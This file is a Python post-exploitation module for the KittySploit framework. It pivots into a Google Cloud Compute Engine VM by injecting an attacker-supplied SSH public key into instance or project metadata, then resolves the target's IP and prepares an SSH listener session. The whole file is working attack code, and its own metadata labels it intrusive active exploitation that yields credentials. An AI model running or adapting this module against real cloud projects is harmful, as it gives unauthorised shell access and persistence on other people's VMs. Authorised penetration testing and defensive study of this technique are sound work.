#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Compute SSH Pivot via Metadata",
        "description": "Pivot to a VM by injecting an SSH key into Compute metadata and preparing a Compute SSH session",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "compute", "ssh", "pivot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'active_exploitation', 'api_request'],
        'expected_requests': 3,
        'reversible': True,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    instance_name = OptString("", "Target Compute Engine instance name", True)
    zone = OptString("", "Instance zone", True)
    ssh_public_key = OptString("", "Attacker SSH public key to inject", True)
    private_key_file = OptString("", "Local private key file for the Compute SSH listener", False)
    username = OptString("", "Metadata SSH username; defaults to current client email local-part", False)
    metadata_scope = OptString("instance", "Metadata scope: project or instance", False)
    use_iap = OptBool(False, "Suggest IAP tunneling for the Compute SSH listener", False)
    internal_ip = OptBool(False, "Resolve and use the instance internal IP", False)
    wait_seconds = OptInteger(5, "Seconds to wait after metadata update before pivot", False)
    export_json = OptString("", "Optional pivot configuration JSON file", False)

    LISTENER_MODULE = "listeners/gcp/compute_ssh"

    def run(self):
        try:
            project_id = self._gcp_project_id()
            instance_name = str(self.instance_name or "").strip()
            zone = str(self.zone or "").strip()
            public_key = str(self.ssh_public_key or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not public_key:
                print_error("ssh_public_key is required")
                return False

            username = self._resolve_username()
            if not username:
                print_error("Could not resolve metadata SSH username")
                return False

            entry = f"{username}:{public_key}"
            scope = str(self.metadata_scope or "instance").strip().lower()
            print_info(f"Injecting SSH key into {scope} metadata for {instance_name}...")
            if scope == "project":
                inject = self._gcp_add_ssh_key_project_metadata(project_id, entry)
                instance = {}
            elif scope == "instance":
                inject = self._gcp_add_ssh_key_instance_metadata(project_id, zone, instance_name, entry)
                instance = (inject.get("instance") or {}) if inject.get("ok") else {}
            else:
                print_error("metadata_scope must be 'project' or 'instance'")
                return False

            if not inject.get("ok"):
                print_error(f"Metadata injection failed: {inject.get('error', '')}")
                return False

            if not instance:
                lookup = self._gcp_get_compute_instance(project_id, zone, instance_name)
                if lookup.get("ok"):
                    instance = lookup.get("instance") or {}

            wait_s = max(0, int(self.wait_seconds or 0))
            if wait_s:
                print_info(f"Waiting {wait_s}s for metadata propagation...")
                time.sleep(wait_s)

            target_host = self._gcp_instance_ip(instance, internal=bool(self.internal_ip))
            pivot = self._gcp_pivot_listener_config(
                self.LISTENER_MODULE,
                {
                    "project_id": project_id,
                    "zone": zone,
                    "instance_name": instance_name,
                    "ssh_username": username,
                    "private_key_file": str(self.private_key_file or "").strip(),
                    "target_host": target_host,
                    "use_iap": bool(self.use_iap),
                    "internal_ip": bool(self.internal_ip),
                },
            )

            print_success("SSH metadata pivot prepared")
            print_info(f"Target VM: {instance_name} ({zone})")
            if target_host:
                print_info(f"Resolved host: {target_host}")
            print_info(f"SSH username: {username}")
            print_info(f"Open listener: {self.LISTENER_MODULE}")
            if pivot["options"].get("private_key_file"):
                print_info(f"Private key: {pivot['options']['private_key_file']}")

            output = {
                "project_id": project_id,
                "metadata_scope": scope,
                "username": username,
                "target_host": target_host,
                "pivot": pivot,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Pivot configuration exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Compute SSH metadata pivot failed: {exc}")
            return False

    def _resolve_username(self):
        configured = str(self.username or "").strip()
        if configured:
            return configured
        email = self._gcp_client_email()
        if email and "@" in email:
            return email.split("@", 1)[0]
        return ""
